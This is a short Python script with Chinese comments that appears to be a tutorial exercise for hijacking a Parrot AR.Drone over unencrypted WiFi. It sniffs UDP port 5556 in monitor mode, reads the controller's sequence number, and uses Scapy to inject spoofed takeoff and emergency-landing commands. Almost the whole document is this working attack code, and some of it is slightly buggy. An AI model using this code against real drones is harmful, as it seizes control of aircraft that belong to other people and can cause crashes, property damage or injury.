"""
控制无线无人机

SkyGrabber

"""

# Parrot Ar.Drone 的无人机:允许 iPhone/Ipad 应用程序通过未加密的 WIFI 控制无人机

# 拦截流量,检测协议:无线适配器设置为混杂模式监听流量

# 一个快速的tcpdump 显示流量来自无人机和 iPhone 的 UDP 5555 端口。导航命令似乎从直接从 iPhone 的 UDP 5556 端口发送。

# 用 Scapy 制作 802.11 数据帧:因为数据包包含RadioTap, 802.11, SNAP, LLC, IP, and UDP 层,我们需要从各个层中复制字段。

# 可以让 Scapy 自动的计算生成数据包,同样,对于一些校验值也是一样。

# coding=UTF-8
import threading
import dup
from scapy.all import *
conf.iface = 'mon0'
NAVPORT = 5556
LAND = '290717696'
EMER = '290717952'
TAKEOFF = '290718208'


class interceptThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.curPkt = None
        self.seq = 0
        self.foundUAV = False

    def run(self):
        sniff(prn=self.interceptPkt, filter='udp port 5556')

    def interceptPkt(self, pkt):
        if self.foundUAV == False:
            print('[*] UAV Found.')

            self.foundUAV = True
            self.curPkt = pkt
            raw = pkt.sprintf('%Raw.load%')
        try:
            self.seq = int(raw.split(',')[0].split('=')[-1]) + 5
        except:
            self.seq = 0

    EMER = "290717952"

    def emergencyland(self):
        spoofSeq = self.seq + 100

        watch = 'AT*COMWDG=%i\r' % spoofSeq
        toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, EMER)
        self.injectCmd(watch)
        self.injectCmd(toCmd)

    def injectCmd(self, cmd):
        radio = dup.dupRadio(self.curPkt)
        dot11 = dup.dupDot11(self.curPkt)
        snap = dup.dupSNAP(self.curPkt)
        llc = dup.dupLLC(self.curPkt)
        ip = dup.dupIP(self.curPkt)
        udp = dup.dupUDP(self.curPkt)
        raw = Raw(load=cmd)
        injectPkt = radio / dot11 / llc / snap / ip / udp / raw
        sendp(injectPkt)

    def takeoff(self):
        spoofSeq = self.seq + 100

        watch = 'AT*COMWDG=%i\r' % spoofSeq
        toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, TAKEOFF)
        self.injectCmd(watch)
        self.injectCmd(toCmd)
